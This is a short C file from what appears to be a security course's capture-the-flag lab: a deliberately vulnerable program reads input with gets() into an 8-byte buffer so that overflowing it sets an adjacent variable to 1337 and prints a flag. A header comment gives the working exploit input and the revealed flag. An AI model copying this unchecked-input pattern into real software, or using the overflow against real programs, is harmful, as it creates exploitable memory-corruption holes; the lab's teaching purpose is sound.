#include <stdio.h>
#include <string.h>

// ../work/course/ransomeware_backup/9_lab on  main [?]
// ❯ python3 -c 'print("A"*8 + "\x39\x05\x00\x00")' | ./buffer_overflow.out
// Enter your input: Flag: CTF{easy_overflow}

void print_flag() {
    char flag[] = "CTF{easy_overflow}";
    printf("Flag: %s\n", flag);
}

int main() {
    int secret = 0;
    char buffer[8];

    printf("Enter your input: ");
    gets(buffer); 

    if (secret == 1337) {
        print_flag();
    } else {
        printf("Access denied. secret = %d\n", secret);
    }

    return 0;
}
